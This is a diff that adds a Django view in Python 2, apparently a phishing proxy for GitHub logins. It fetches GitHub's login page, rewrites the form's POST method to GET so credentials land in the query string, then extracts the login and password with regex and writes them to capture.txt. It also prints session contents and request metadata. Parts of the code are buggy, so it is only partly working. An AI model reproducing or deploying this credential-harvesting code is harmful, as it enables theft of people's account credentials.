@@ -1,1 +1,28 @@
 # Create your views here.
+from django.http import HttpResponse
+import urllib2
+import requests
+import re
+import sys
+def main_page(request):
+    print request.session.items()
+    print request.META
+    print request.path
+    if request.method == 'GET' and re.search('(?<=password=)\w+',request.body) !=  None:
+        print re.search('(?<=password=)\w+',request.text).group(0) 
+    return HttpResponse(seeGitHubPass(request))
+
+def seeGitHubPass(request):
+    if request.method == 'GET' and re.search('(?<=password=)\w+',request.META['QUERY_STRING']) !=  None:
+        with open('capture.txt','w') as f:
+            f.write('username: {0:s} \n' + re.search('(?<=login=)\w+',request.META['QUERY_STRING']).group(0))
+            f.write('password: {0:s} \n' + re.search('(?<=password=)\w+',request.META['QUERY_STRING']).group(0))
+    url = 'http://www.github.com/login'
+    if re.search('(?<=action=/session)',request.body) != None:
+        url = 'http://www.github.com/'
+    r = requests.get(url)
+    replacePost = re.sub(r'post','get',r.text,flags=re.IGNORECASE)
+    return replacePost
+
+
+
